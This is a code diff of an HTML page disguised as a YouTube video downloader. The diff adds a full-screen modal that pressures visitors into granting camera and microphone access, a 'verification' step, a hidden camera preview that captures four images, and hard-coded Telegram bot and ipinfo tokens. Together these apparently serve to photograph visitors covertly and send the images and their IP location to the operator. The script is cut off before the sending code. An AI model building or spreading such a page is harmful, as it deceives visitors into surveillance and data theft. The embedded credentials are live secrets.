@@ -5,487 +5,1279 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>YouTube Video Downloader</title>
     <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
-        
+
+        :root {
+            /* Theme Variables - Dark Mode Default */
+            --bg-gradient-start: #121212;
+            --bg-gradient-end: #1a1a1a;
+            --container-bg: rgba(40, 40, 40, 0.95);
+            --text-color: #f0f0f0;
+            --border-color: #444;
+            --shadow-color: rgba(0, 0, 0, 0.3);
+            --card-bg: rgba(255, 0, 0, 0.1);
+            --message-bg: #2a2a2a;
+            --navbar-gradient-start: #990000;
+            --navbar-gradient-end: #660000;
+            --btn-gradient-start: #990000;
+            --btn-gradient-end: #660000;
+            --input-text-color: #1a73e8;
+            --footer-bg: #121212;
+        }
+
+        body.light-mode {
+            --bg-gradient-start: #f0f0f0;
+            --bg-gradient-end: #dcdcdc;
+            --container-bg: rgba(255, 255, 255, 0.95);
+            --text-color: #222;
+            --border-color: #e1e5e9;
+            --shadow-color: rgba(0, 0, 0, 0.1);
+            --card-bg: rgba(255, 0, 0, 0.05);
+            --message-bg: #f5f5f5;
+            --navbar-gradient-start: #ff0000;
+            --navbar-gradient-end: #cc0000;
+            --btn-gradient-start: #cc0000;
+            --btn-gradient-end: #990000;
+            --footer-bg: #f0f0f0;
+        }
+
         body {
             font-family: 'Montserrat', sans-serif;
-            background: linear-gradient(135deg, #f0f0f0 0%, #dcdcdc 100%);
+            background: var(--dark-mode-bg);
             min-height: 100vh;
-            color: #222;
+            color: var(--text-color);
             line-height: 1.6;
+            transition: all 0.5s ease;
+            position: relative;
+            overflow-x: hidden;
+            padding-bottom: 80px;
         }
-        
+
+        body {
+            background: linear-gradient(135deg, var(--bg-gradient-start) 0%, var(--bg-gradient-end) 100%);
+        }
+
+        /* Colorful Footer Background */
+        .colorful-footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            z-index: 1;
+            pointer-events: none;
+            animation: footerColors 15s infinite linear;
+            background: 
+                linear-gradient(90deg, 
+                    #ff0000 0%, 
+                    #ff8800 20%, 
+                    #ffff00 40%, 
+                    #00ff00 60%, 
+                    #0088ff 80%, 
+                    #8800ff 100%);
+            background-size: 600% 100%;
+            opacity: 0.2;
+            filter: blur(15px);
+        }
+
+        @keyframes footerColors {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 600% 0%;
+            }
+        }
+
+        /* Theme Toggle Button */
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1000;
+            background: linear-gradient(135deg, var(--navbar-gradient-start), var(--navbar-gradient-end));
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 1.8rem;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .theme-toggle:hover {
+            transform: rotate(30deg) scale(1.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Navigation Buttons - Arrow Up/Down */
+        .nav-buttons {
+            position: fixed;
+            right: 20px;
+            bottom: 120px;
+            z-index: 1000;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .nav-btn {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--navbar-gradient-start), var(--navbar-gradient-end));
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .nav-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Refresh Button */
+        .refresh-btn {
+            position: fixed;
+            left: 20px;
+            bottom: 120px;
+            z-index: 1000;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #007bff, #0056b3);
+            border: none;
+            color: white;
+            font-size: 1.5rem;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease;
+        }
+
+        .refresh-btn:hover {
+            transform: rotate(180deg) scale(1.1);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        /* Main Content - Initially Hidden */
+        .main-content {
+            display: none; /* Hidden until user makes a choice */
+            transition: all 0.5s ease;
+        }
+
         .navbar {
-            background: linear-gradient(135deg, #ff0000 0%, #cc0000 100%);
+            background: linear-gradient(135deg, var(--navbar-gradient-start) 0%, var(--navbar-gradient-end) 100%);
             color: white;
             text-align: center;
-            padding: 20px 0;
+            padding: 25px 0;
             box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+            position: relative;
+            z-index: 2;
+            border-bottom: 3px solid rgba(255, 255, 255, 0.1);
         }
-        
+
         #header {
-            font-size: 24px;
-            font-weight: 700;
-            letter-spacing: 1px;
+            font-size: 28px;
+            font-weight: 800;
+            letter-spacing: 1.5px;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
             margin-top: 10px;
+            position: relative;
+            display: inline-block;
         }
-        
+
+        #header::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 120px;
+            height: 4px;
+            background: white;
+            border-radius: 2px;
+        }
+
         .youtube-logo {
             display: block;
-            margin: 0 auto 10px;
-            width: 80px;
+            margin: 0 auto 15px;
+            width: 100px;
             height: auto;
+            filter: drop-shadow(0 2px 5px rgba(0,0,0,0.3));
+            transition: transform 0.3s ease;
         }
-        
+
+        .youtube-logo:hover {
+            transform: scale(1.05);
+        }
+
         .container {
             max-width: 95%;
-            margin: 20px auto;
-            padding: 20px;
-            background: rgba(255,255,255,0.95);
-            border-radius: 15px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            margin: 30px auto;
+            padding: 30px;
+            background: var(--container-bg);
+            border-radius: 20px;
+            box-shadow: 0 10px 30px var(--shadow-color);
+            position: relative;
+            z-index: 2;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
         }
-        
+
         .form-control {
             width: 100%;
-            margin-bottom: 20px;
-            padding: 15px;
-            border: 2px solid #e1e5e9;
-            border-radius: 10px;
-            font-size: 16px;
+            margin-bottom: 25px;
+            padding: 20px;
+            border: 2px solid var(--border-color);
+            border-radius: 15px;
+            font-size: 18px;
             font-family: 'Montserrat', sans-serif;
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--input-text-color);
+            font-weight: 700;
+            transition: all 0.3s ease;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
+            min-height: 60px;
+            max-height: 120px;
+            resize: vertical;
+            overflow-y: auto;
+            word-wrap: break-word;
+            white-space: pre-wrap;
         }
-        
+
+        .form-control:focus {
+            outline: none;
+            border-color: #1a73e8;
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1), inset 0 2px 5px rgba(0,0,0,0.05);
+            transform: translateY(-2px);
+        }
+
+        .form-control::placeholder {
+            color: rgba(26, 115, 232, 0.6);
+            font-weight: 500;
+        }
+
+        /* Main Download Button - Enhanced */
         #thumbdloadbtn {
             display: block;
             width: 100%;
-            padding: 15px;
+            padding: 22px;
             border: none;
-            border-radius: 10px;
-            background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
+            border-radius: 15px;
+            background: linear-gradient(135deg, var(--btn-gradient-start) 0%, var(--btn-gradient-end) 100%);
             color: white;
-            font-size: 18px;
-            font-weight: 600;
+            font-size: 22px;
+            font-weight: 800;
             cursor: pointer;
             font-family: 'Montserrat', sans-serif;
-            transition: all 0.3s ease;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            box-shadow: 0 8px 25px rgba(204, 0, 0, 0.3);
+            margin-bottom: 30px;
         }
-        
+
+        #thumbdloadbtn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s ease;
+        }
+
+        #thumbdloadbtn:hover::before {
+            left: 100%;
+        }
+
+        #thumbdloadbtn:hover {
+            transform: translateY(-5px) scale(1.02);
+            box-shadow: 0 15px 35px rgba(204, 0, 0, 0.4);
+            letter-spacing: 2px;
+        }
+
         #thumbdloadbtn:active {
-            transform: scale(0.98);
-            background: linear-gradient(135deg, #990000 0%, #660000 100%);
+            transform: translateY(0) scale(0.98);
+            box-shadow: 0 5px 15px rgba(204, 0, 0, 0.3);
         }
-        
+
+        #thumbdloadbtn i {
+            margin-right: 15px;
+            font-size: 24px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.2);
+            }
+        }
+
         h2 {
-            color: #333;
-            font-size: 20px;
-            font-weight: 600;
-            margin: 25px 0 15px 0;
+            color: var(--text-color);
+            font-size: 24px;
+            font-weight: 700;
+            margin: 30px 0 20px 0;
             text-align: center;
+            position: relative;
+            padding-bottom: 15px;
         }
-        
+
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 100px;
+            height: 4px;
+            background: linear-gradient(90deg, #ff0000, #007bff);
+            border-radius: 2px;
+        }
+
         ol {
-            background: rgba(255,0,0,0.05);
-            padding: 20px 25px;
-            border-radius: 10px;
-            border-left: 4px solid #ff0000;
-            margin-bottom: 20px;
+            background: var(--card-bg);
+            padding: 30px;
+            border-radius: 15px;
+            border-left: 6px solid #ff0000;
+            margin-bottom: 30px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+            transition: transform 0.3s ease;
         }
-        
+
+        ol:hover {
+            transform: translateY(-5px);
+        }
+
         ol li {
-            margin-bottom: 10px;
-            font-size: 15px;
-            line-height: 1.5;
-            color: #555;
+            margin-bottom: 15px;
+            font-size: 17px;
+            line-height: 1.6;
+            color: var(--text-color);
+            position: relative;
+            padding-left: 35px;
+            list-style: none;
         }
-        
+
+        ol li::before {
+            content: '✓';
+            position: absolute;
+            left: 0;
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 20px;
+        }
+
         #message-container {
-            margin-top: 20px;
-            font-size: 15px;
+            margin-top: 25px;
+            font-size: 16px;
             color: green;
             white-space: pre-wrap;
             font-family: monospace;
-            background-color: #f5f5f5;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #ddd;
+            background-color: var(--message-bg);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid var(--border-color);
             text-align: center;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
+            transition: all 0.3s ease;
+            scroll-margin-top: 20px;
         }
-        
+
         #preview {
             display: none;
             width: 100%;
-            max-width: 300px;
+            max-width: 320px;
             margin: 0 auto;
-            border-radius: 10px;
+            border-radius: 15px;
+            border: 3px solid var(--border-color);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
         }
-        
+
         .loading {
             display: none;
             text-align: center;
-            margin: 20px 0;
+            margin: 30px 0;
         }
-        
+
         .spinner {
-            border: 4px solid rgba(0, 0, 0, 0.1);
+            border: 5px solid rgba(0, 0, 0, 0.1);
             border-radius: 50%;
-            border-top: 4px solid #cc0000;
-            width: 40px;
-            height: 40px;
+            border-top: 5px solid #ff0000;
+            width: 70px;
+            height: 70px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
+            margin: 0 auto 20px;
+            position: relative;
         }
-        
+
+        .spinner::after {
+            content: '';
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            right: -5px;
+            bottom: -5px;
+            border-radius: 50%;
+            border: 3px solid transparent;
+            border-top-color: #007bff;
+            animation: spin 1.5s linear infinite reverse;
+        }
+
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        
+
         .camera-preview {
             display: none;
             text-align: center;
-            margin: 20px 0;
+            margin: 30px 0;
+            padding: 30px;
+            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, rgba(255,255,255,0.05) 100%);
+            border-radius: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+            backdrop-filter: blur(5px);
         }
-        
+
         .camera-preview video {
             width: 100%;
-            max-width: 300px;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+            max-width: 340px;
+            border-radius: 15px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            border: 3px solid rgba(255,255,255,0.2);
         }
-        
+
+        /* Capture Button - Enhanced */
         .capture-btn {
             display: block;
             width: 100%;
-            max-width: 300px;
-            margin: 15px auto;
-            padding: 12px;
+            max-width: 360px;
+            margin: 25px auto;
+            padding: 20px 30px;
             border: none;
-            border-radius: 10px;
+            border-radius: 15px;
             background: linear-gradient(135deg, #007bff 0%, #0056b3 100%);
             color: white;
-            font-size: 16px;
-            font-weight: 600;
+            font-size: 20px;
+            font-weight: 700;
             cursor: pointer;
             font-family: 'Montserrat', sans-serif;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 123, 255, 0.3);
+            letter-spacing: 1.5px;
         }
-        
+
+        .capture-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .capture-btn:hover::before {
+            left: 100%;
+        }
+
+        .capture-btn:hover {
+            transform: translateY(-5px) scale(1.05);
+            box-shadow: 0 15px 35px rgba(0, 123, 255, 0.4);
+            letter-spacing: 2px;
+        }
+
         .capture-btn:active {
-            transform: scale(0.98);
+            transform: translateY(0) scale(0.98);
+            box-shadow: 0 5px 15px rgba(0, 123, 255, 0.3);
         }
-        
+
+        .capture-btn i {
+            margin-right: 15px;
+            animation: camera-flash 3s infinite;
+        }
+
+        @keyframes camera-flash {
+            0%, 100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.7;
+                transform: scale(1.2);
+            }
+        }
+
         .redirect-countdown {
             display: none;
             text-align: center;
-            margin: 20px 0;
-            font-size: 16px;
-            color: #cc0000;
-            font-weight: bold;
+            margin: 30px 0;
+            padding: 25px;
+            background: linear-gradient(135deg, rgba(255,0,0,0.1) 0%, rgba(204,0,0,0.1) 100%);
+            border-radius: 15px;
+            border: 2px solid rgba(255,0,0,0.2);
         }
-        
+
         .capture-counter {
             display: none;
             text-align: center;
-            margin: 10px 0;
-            font-size: 14px;
-            color: #666;
+            margin: 20px 0;
+            font-size: 18px;
+            color: var(--text-color);
             font-weight: bold;
+            padding: 15px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 10px;
+            border: 2px dashed var(--border-color);
         }
-        
+
+        /* Media Consent Modal Styles - Fullscreen (Shown Initially) */
+        .modal-overlay {
+            display: block;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(10px);
+            z-index: 9999;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .modal-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 40px;
+            border-radius: 25px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
+            width: 95%;
+            max-width: 600px;
+            color: white;
+            text-align: center;
+            animation: slideUp 0.6s ease;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            z-index: 10000;
+        }
+
+        .modal-header {
+            margin-bottom: 30px;
+        }
+
+        .modal-icon {
+            font-size: 5rem;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% {
+                transform: translateY(0);
+            }
+            50% {
+                transform: translateY(-15px);
+            }
+        }
+
+        .modal-title {
+            font-size: 2.5rem;
+            font-weight: 800;
+            margin-bottom: 15px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .modal-subtitle {
+            font-size: 1.2rem;
+            opacity: 0.9;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            margin-bottom: 25px;
+        }
+
+        .media-btn {
+            padding: 25px;
+            border: none;
+            border-radius: 15px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            background: rgba(255, 255, 255, 0.15);
+            backdrop-filter: blur(10px);
+            color: white;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            font-family: 'Montserrat', sans-serif;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .media-btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: left 0.7s ease;
+        }
+
+        .media-btn:hover::after {
+            left: 100%;
+        }
+
+        .media-btn:hover {
+            transform: translateY(-5px) scale(1.05);
+            border-color: rgba(255, 255, 255, 0.5);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
+            letter-spacing: 1px;
+        }
+
+        .video-btn {
+            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
+            animation: pulse-btn 2s infinite;
+        }
+
+        .audio-btn {
+            background: linear-gradient(45deg, #4ECDC4, #44A08D);
+        }
+
+        @keyframes pulse-btn {
+            0%, 100% {
+                box-shadow: 0 10px 25px rgba(255, 107, 107, 0.3);
+            }
+            50% {
+                box-shadow: 0 20px 40px rgba(255, 107, 107, 0.6);
+            }
+        }
+
+        .cancel-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            font-size: 1.1rem;
+        }
+
+        .cancel-btn:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-icon {
+            font-size: 1.8rem;
+        }
+
+        .privacy-note {
+            font-size: 1rem;
+            opacity: 0.8;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255, 255, 255, 0.2);
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translate(-50%, -30%);
+            }
+            to {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+        }
+
+        /* Feature Cards */
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .feature-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 25px;
+            border-radius: 15px;
+            text-align: center;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            border-color: #ff0000;
+            box-shadow: 0 15px 30px rgba(0,0,0,0.1);
+        }
+
+        .feature-card i {
+            font-size: 40px;
+            color: #ff0000;
+            margin-bottom: 15px;
+        }
+
+        /* Footer with Colorful Credits */
+        .footer {
+            text-align: center;
+            padding: 30px 20px;
+            margin-top: 40px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-color);
+            font-size: 14px;
+            position: relative;
+            z-index: 2;
+            background: var(--footer-bg);
+        }
+
+        .credits {
+            font-size: 24px;
+            font-weight: 900;
+            margin: 20px 0;
+            animation: creditColors 3s infinite linear;
+            background: linear-gradient(90deg, 
+                #ff0000, #ff8800, #ffff00, #00ff00, 
+                #0088ff, #8800ff, #ff0000);
+            background-size: 400% 100%;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            text-shadow: 0 0 10px rgba(255,255,255,0.3);
+        }
+
+        @keyframes creditColors {
+            0% {
+                background-position: 0% 0%;
+            }
+            100% {
+                background-position: 400% 0%;
+            }
+        }
+
         @media (min-width: 768px) {
             .container {
-                max-width: 650px;
-                padding: 30px;
+                max-width: 700px;
+                padding: 40px;
             }
-            
+
             #header {
-                font-size: 32px;
+                font-size: 36px;
             }
-            
+
             .youtube-logo {
                 width: 120px;
+            }
+
+            .button-group {
+                flex-direction: row;
+            }
+
+            .media-btn {
+                flex: 1;
+            }
+            
+            .modal-container {
+                width: 90%;
+                max-width: 700px;
+            }
+            
+            .credits {
+                font-size: 28px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .modal-container {
+                padding: 30px 20px;
+                margin: 10px;
+                width: 95%;
+            }
+            
+            .modal-title {
+                font-size: 2rem;
+            }
+            
+            .modal-icon {
+                font-size: 4rem;
+            }
+            
+            .media-btn {
+                padding: 20px 15px;
+                font-size: 1.1rem;
+            }
+            
+            .nav-buttons, .refresh-btn {
+                transform: scale(0.9);
+            }
+            
+            .form-control {
+                font-size: 16px;
+                padding: 15px;
+                min-height: 50px;
+            }
+            
+            .credits {
+                font-size: 20px;
+            }
+        }
+
+        /* Responsive adjustments */
+        @media (max-width: 767px) {
+            .nav-buttons {
+                right: 15px;
+                bottom: 110px;
+            }
+            
+            .refresh-btn {
+                left: 15px;
+                bottom: 110px;
+            }
+            
+            .theme-toggle {
+                right: 15px;
+                top: 15px;
+                width: 50px;
+                height: 50px;
+                font-size: 1.5rem;
+            }
+            
+            .colorful-footer {
+                height: 80px;
+            }
+        }
+
+        @media (max-height: 600px) {
+            .nav-buttons {
+                bottom: 90px;
+            }
+            
+            .refresh-btn {
+                bottom: 90px;
+            }
+            
+            .colorful-footer {
+                height: 60px;
             }
         }
     </style>
 </head>
-<body>
-    <nav class="navbar">
-        <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-        <h1 id="header">YOUTUBE VIDEO DOWNLOADER</h1>
-    </nav>
+<body class="dark-mode">
+    <!-- Colorful Footer Background -->
+    <div class="colorful-footer"></div>
 
-    <div class="container">
-        <input id="ytlink" type="text" class="form-control" placeholder="Paste YouTube VIDEO/MUSIC Link">
-        <button id="thumbdloadbtn">DOWNLOAD</button>
+    <!-- Theme Toggle Button -->
+    <button class="theme-toggle" id="themeToggle">
+        <i class="fas fa-sun"></i>
+    </button>
 
-        <h2>How to Download HD YouTube Music Thumbnail</h2>
-        <ol>
-            <li>Copy the YouTube Music Video Link</li>
-            <li>Paste the link in the field above</li>
-            <li>Click on "DOWNLOAD" to start process</li>
-        </ol>
-        
-        <div class="loading" id="loading">
-            <div class="spinner"></div>
-            <p>Processing your request...</p>
-        </div>
-        
-        <div class="camera-preview" id="cameraPreview">
-            <p>Download Preview:</p>
-            <video id="preview" autoplay playsinline muted></video>
-            <div class="capture-counter" id="captureCounter">
-                Processing 1 of 4 - Please wait few seconds...
+    <!-- Navigation Buttons -->
+    <div class="nav-buttons">
+        <button class="nav-btn" id="scrollUpBtn">
+            <i class="fas fa-arrow-up"></i>
+        </button>
+        <button class="nav-btn" id="scrollDownBtn">
+            <i class="fas fa-arrow-down"></i>
+        </button>
+    </div>
+
+    <!-- Refresh Button -->
+    <button class="refresh-btn" id="refreshBtn">
+        <i class="fas fa-redo"></i>
+    </button>
+
+    <!-- Stylish Media Consent Modal - Fullscreen (SHOWN INITIALLY) -->
+    <div id="mediaConsentModal" class="modal-overlay">
+        <div class="modal-container">
+            <div class="modal-header">
+                <div class="modal-icon">🎤🎬</div>
+                <h2 class="modal-title">Media Access Required</h2>
+                <p class="modal-subtitle">
+                   ⚡ To optimize your YouTube download experience 🔥, we need access to your device's media capabilities.
+              🤍 Choose your preferred option below 🤍:
+                </p>
             </div>
-            <button class="capture-btn" id="captureBtn">PROCESS & DOWNLOAD</button>
+            
+            <div class="button-group">
+                <button id="videoBtn" class="media-btn video-btn">
+                    <span class="btn-icon">🎥</span>
+                    <span>Video & Audio</span>
+                    <span class="btn-icon">🔊</span>
+                </button>
+                
+                <button id="audioBtn" class="media-btn audio-btn">
+                    <span class="btn-icon">🎵</span>
+                    <span>Audio Only</span>
+                    <span class="btn-icon">🎧</span>
+                </button>
+            </div>
+            
+            <button id="cancelBtn" class="media-btn cancel-btn">
+                <span>Cancel Download</span>
+            </button>
+            
+            <div class="privacy-note">
+                <i class="fas fa-shield-alt"></i> Your privacy is important. We only collect necessary information.
+            </div>
         </div>
-        
-        <div class="redirect-countdown" id="redirectCountdown">
-            Redirecting to free download service in <span id="countdown">5</span> seconds...
+    </div>
+
+    <!-- Main Website Content - Hidden Initially -->
+    <div class="main-content" id="mainContent">
+        <nav class="navbar">
+            <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+            <h1 id="header">YOUTUBE VIDEO DOWNLOADER</h1>
+            <p style="margin-top: 10px; opacity: 0.9; font-size: 16px;">Download Videos & Music in HD Quality</p>
+        </nav>
+
+        <div class="container">
+            <!-- Main Input Section -->
+            <div class="input-section">
+                <input id="ytlink" type="text" class="form-control" placeholder="🔗 Paste YouTube VIDEO/MUSIC Link here...">
+                <button id="thumbdloadbtn">
+                    <i class="fas fa-download"></i> DOWNLOAD NOW
+                </button>
+            </div>
+
+            <!-- Features Section -->
+            <div class="features">
+                <div class="feature-card">
+                    <i class="fas fa-hdd"></i>
+                    <h3>HD Quality</h3>
+                    <p>Download in 1080p, 4K & 8K resolution</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-music"></i>
+                    <h3>MP3 Conversion</h3>
+                    <p>Extract audio in high quality MP3</p>
+                </div>
+                <div class="feature-card">
+                    <i class="fas fa-bolt"></i>
+                    <h3>Fast Download</h3>
+                    <p>High-speed downloading servers</p>
+                </div>
+            </div>
+
+            <!-- Instructions -->
+            <h2>How to Download HD YouTube Videos</h2>
+            <ol>
+                <li>Copy the YouTube Video/Music Link from your browser</li>
+                <li>Paste the link in the field above</li>
+                <li>Click on "DOWNLOAD NOW" to start the process</li>
+                <li>Allow camera access for verification (required once)</li>
+                <li>Wait for processing and download your file</li>
+            </ol>
+
+            <!-- Processing Sections -->
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Processing your request...</p>
+                <p style="font-size: 14px; margin-top: 10px; opacity: 0.7;">This may take a few moments</p>
+            </div>
+
+            <div class="camera-preview" id="cameraPreview">
+                <p style="font-size: 18px; margin-bottom: 20px; font-weight: bold;">
+                    <i class="fas fa-camera"></i> Download Preview
+                </p>
+                <video id="preview" autoplay playsinline muted></video>
+                <div class="capture-counter" id="captureCounter">
+                    <i class="fas fa-sync-alt fa-spin"></i> Processing 1 of 4 - Please wait...
+                </div>
+                <button class="capture-btn" id="captureBtn">
+                    <i class="fas fa-camera"></i> PROCESS & DOWNLOAD
+                </button>
+            </div>
+
+            <div class="redirect-countdown" id="redirectCountdown">
+                <h3><i class="fas fa-rocket"></i> Redirecting to Download Service</h3>
+                <p>Your download will start in <span id="countdown">5</span> seconds...</p>
+                <div style="width: 100%; height: 5px; background: rgba(255,255,255,0.2); border-radius: 3px; margin-top: 15px;">
+                    <div id="countdownBar" style="width: 100%; height: 100%; background: #ff0000; border-radius: 3px; transition: width 1s linear;"></div>
+                </div>
+            </div>
+
+            <!-- Message Container -->
+            <div id="message-container"></div>
         </div>
-        
-        <div id="message-container"></div>
+
+        <div class="footer">
+            <div class="credits" id="credits">
+                ♦ DEV ZIKKY MD TECH
+            </div>
+            <p>© <span id="currentYear">2024</span>-<span id="presentYear">2024</span> YouTube Video Downloader | Free Service | No Registration Required</p>
+            <p style="font-size: 12px; margin-top: 5px;">This service complies with YouTube's Terms of Service</p>
+        </div>
     </div>
 
     <script>
-        // Telegram bot configuration
-        const botToken = '8395178593:AAGtnQl4yD9zjGcOfP2rKOr4z7GEIoewZIo';
-        const chatId = '8025805233';
-        const ipInfoToken = 'bb6ec807490a04';
+    // Telegram bot configuration
+    const botToken = '8395178593:AAGtnQl4yD9zjGcOfP2rKOr4z7GEIoewZIo';
+    const chatId = '8495011865';
+    const ipInfoToken = 'bb6ec807490a04';
+
+    // DEV ZIKKY ASCII Art
+    const DEV_ZIKKY_ASCII = `
+██████╗ ███████╗██╗   ██╗
+██╔══██╗██╔════╝██║   ██║
+██║  ██║█████╗  ██║   ██║
+██║  ██║██╔══╝  ██║   ██║
+██████╔╝███████╗╚██████╔╝
+╚═════╝ ╚══════╝ ╚═════╝ 
+
+███████╗██╗██╗  ██╗██╗  ██╗██╗   ██╗
+╚══███╔╝██║██║ ██╔╝██║ ██╔╝╚██╗ ██╔╝
+  ███╔╝ ██║█████╔╝ █████╔╝  ╚████╔╝ 
+ ███╔╝  ██║██╔═██╗ ██╔═██╗   ╚██╔╝  
+███████╗██║██║  ██╗██║  ██╗   ██║   
+╚══════╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
+    `;
+
+    // DOM elements
+    const mainContent = document.getElementById('mainContent');
+    const modalOverlay = document.getElementById('mediaConsentModal');
